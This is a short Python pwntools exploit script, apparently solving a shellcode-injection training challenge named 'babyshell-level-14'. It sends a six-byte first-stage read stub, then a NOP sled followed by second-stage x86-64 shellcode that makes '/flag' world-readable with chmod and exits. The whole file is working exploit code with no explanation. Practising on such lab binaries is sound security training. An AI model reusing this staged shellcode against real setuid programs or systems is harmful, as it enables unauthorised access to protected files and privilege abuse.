from pwn import *

stage_1_read = b'1\xff\x89\xd6\x0f\x05'

stage_2_chmod = b'H\xc7\xc0Z\x00\x00\x00H\x8d=\x15\x00\x00\x00H\xc7\xc6\xff\x01\x00\x00\x0f\x05H\xc7\xc0<\x00\x00\x00H1\xff\x0f\x05/flag\x00'

stage_2_chmod_nops = b'\x90'*8 + stage_2_chmod

p = process("./babyshell-level-14", env={})

p.recvuntil(b'Reading 0x6 bytes from stdin.\n')

p.send(stage_1_read)

p.send(stage_2_chmod_nops)

p.recvall()

p.close()

